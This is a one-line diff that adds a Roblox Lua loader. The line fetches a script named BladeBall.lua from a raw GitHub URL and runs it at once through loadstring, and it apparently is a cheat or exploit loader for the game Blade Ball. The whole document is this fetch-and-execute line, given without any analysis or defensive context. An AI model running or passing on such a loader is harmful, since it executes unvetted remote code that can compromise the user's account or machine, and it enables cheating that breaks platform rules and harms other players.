@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LookP/Roblox/main/BladeBall.lua"))()
